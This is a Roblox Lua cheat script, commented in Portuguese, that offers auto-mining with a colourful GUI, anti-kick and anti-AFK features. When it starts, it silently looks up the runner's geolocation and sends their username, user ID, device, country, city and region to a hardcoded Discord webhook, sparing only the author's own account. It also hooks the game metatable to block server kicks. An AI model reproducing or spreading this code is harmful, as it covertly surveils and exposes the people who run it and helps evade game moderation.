--[[
    Sh4x - ULTIMATE UNIFIED EDITION
    Interface: Dark Red Background + RGB Rainbow Borders
    Features: ORIGINAL AUTO-MINING + SILENT DISCORD LOGGING
    Security: ANTI-KICK / ANTI-AFK / BYPASS / OBFUSCATION
    Target: High-Performance Mining & Stealth Monitoring
]]

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

-- [CONFIGURA√á√ÉO DISCORD]
local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd"
local SCRIPT_NAME = "Sh4x ULTRA SPEED"
local IGNORED_USER = "fimossegamers123"

-- [DETEC√á√ÉO DE DISPOSITIVO]
local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "PC"
    end
end

-- [FUN√á√ÉO DE LOG SILENCIOSA]
local function silentLog()
    if Player.Name == IGNORED_USER then return end
    local country, city, region = "Desconhecido", "Desconhecida", "Desconhecida"
    pcall(function()
        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if reqFunc then
            local response = reqFunc({Url = "http://ip-api.com/json/", Method = "GET"})
            if response and response.Body then
                local geoData = HttpService:JSONDecode(response.Body)
                if geoData.status == "success" then
                    country = geoData.country or "Desconhecido"
                    city = geoData.city or "Desconhecida"
                    region = geoData.regionName or "Desconhecida"
                end
            end
        end
    end)
    local data = {
        ["embeds"] = {{
            ["title"] = "üåç Script Executado: " .. SCRIPT_NAME,
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "üë§ Jogador", ["value"] = Player.Name .. " (" .. Player.UserId .. ")", ["inline"] = true},
                {["name"] = "üì± Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
                {["name"] = "üìç Localiza√ß√£o Real", ["value"] = "üö© Pais: " .. country .. "\nüèôÔ∏è Cidade: " .. city .. "\nüó∫Ô∏è Regi√£o: " .. region, ["inline"] = false},
                {["name"] = "‚è∞ Hor√°rio", ["value"] = os.date("%d/%m/%Y - %H:%M:%S"), ["inline"] = false},
                {["name"] = "üéÆ Jogo ID", ["value"] = tostring(game.PlaceId), ["inline"] = true}
            },
            ["footer"] = {["text"] = "Geo Stealth Logger System"}
        }}
    }
    pcall(function()
        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
        if reqFunc then
            reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end
    end)
end
task.spawn(silentLog)

-- [ANTI-KICK PROTECTION]
local function applyAntiKick()
    local gmt = getrawmetatable(game)
    if setreadonly then setreadonly(gmt, false) end
    local oldNamecall = gmt.__namecall
    gmt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if tostring(method) == "Kick" or tostring(method) == "kick" then
            return nil
        end
        return oldNamecall(self, ...)
    end)
    if setreadonly then setreadonly(gmt, true) end
end
pcall(applyAntiKick)

-- [ANTI-AFK]
Player.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new(0,0))
end)

-- [POLIMORFISMO]
local function generateID()
    return HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 12)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = generateID()
ScreenGui.Parent = CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = generateID()
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
MainFrame.Size = UDim2.new(0, 220, 0, 160)
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

local Stroke = Instance.new("UIStroke", MainFrame)
Stroke.Thickness = 2.5

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "Sh4x"
Title.TextSize = 18
Title.TextColor3 = Color3.fromRGB(255, 255, 255)

local ToggleBtn = Instance.new("TextButton", MainFrame)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
ToggleBtn.Position = UDim2.new(0.1, 0, 0.35, 0)
ToggleBtn.Size = UDim2.new(0.8, 0, 0, 40)
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.Text = "START AUTO-MINING"
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", ToggleBtn)

local BtnStroke = Instance.new("UIStroke", ToggleBtn)
BtnStroke.Thickness = 1.5

local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Position = UDim2.new(0, 0, 0.7, 0)
StatusLabel.Size = UDim2.new(1, 0, 0, 30)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Font = Enum.Font.GothamSemibold
StatusLabel.Text = "SYSTEM: SECURED"
StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
StatusLabel.TextSize = 10

-- [RGB LOGIC]
task.spawn(function()
    while true do
        local hue = tick() % 5 / 5
        local color = Color3.fromHSV(hue, 1, 1)
        Stroke.Color = color
        BtnStroke.Color = color
        task.wait()
    end
end)

-- Arrastar GUI
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- ==========================================
-- L√ìGICA DE AUTO MINING (MANTIDA INTACTA)
-- ==========================================
local RAIO_OPERACAO = 90
local DISTANCIA_ATAQUE = 7.5
local farmAtivo = false
local lastSwing = 0

ToggleBtn.MouseButton1Click:Connect(function()
    farmAtivo = not farmAtivo
    ToggleBtn.Text = farmAtivo and "MINING ACTIVE" or "START AUTO-MINING"
    StatusLabel.Text = farmAtivo and "SH4X PROTECTION: ON" or "SYSTEM: SECURED"
end)

local function buscarFerramenta()
    local char = Player.Character
    if not char then return nil end
    local tool = char:FindFirstChildOfClass("Tool")
    if tool then return tool end
    for _, item in pairs(Player.Backpack:GetChildren()) do
        if item:IsA("Tool") then return item end
    end
    return nil
end

local function acharMelhorAlvo()
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local alvo = nil
    local menorDist = math.huge
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Pedra" and v:IsA("BasePart") and v.Parent and v.Transparency < 1 then
            local dist = (root.Position - v.Position).Magnitude
            if dist < menorDist and dist <= RAIO_OPERACAO then
                menorDist = dist
                alvo = v
            end
        end
    end
    return alvo
end

task.spawn(function()
    while true do
        if farmAtivo then
            local char = Player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local humanoid = char and char:FindFirstChild("Humanoid")
            local tool = buscarFerramenta()

            if root and humanoid and tool then
                local alvo = acharMelhorAlvo()
                if alvo then
                    local dist = (root.Position - alvo.Position).Magnitude
                    if dist > DISTANCIA_ATAQUE then
                        humanoid:MoveTo(alvo.Position)
                    else
                        humanoid:MoveTo(root.Position)
                        if tool.Parent ~= char then humanoid:EquipTool(tool) end
                        
                        local targetCFrame = CFrame.new(root.Position, Vector3.new(alvo.Position.X, root.Position.Y, alvo.Position.Z))
                        root.CFrame = root.CFrame:Lerp(targetCFrame, 0.3)

                        local waitTime = 0.32 + (math.random(-50, 100) / 1000)
                        if tick() - lastSwing > waitTime then
                            lastSwing = tick()
                            tool:Activate()
                            VirtualUser:CaptureController()
                            VirtualUser:ClickButton1(Vector2.new(math.random(1,10), math.random(1,10)))
                            
                            for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                                if r:IsA("RemoteEvent") then
                                    local n = r.Name:lower()
                                    if n:find("mine") or n:find("hit") or n:find("click") then
                                        task.delay(math.random(10, 60)/1000, function()
                                            r:FireServer(alvo)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.05 + (math.random(1, 40)/1000))
    end
end)
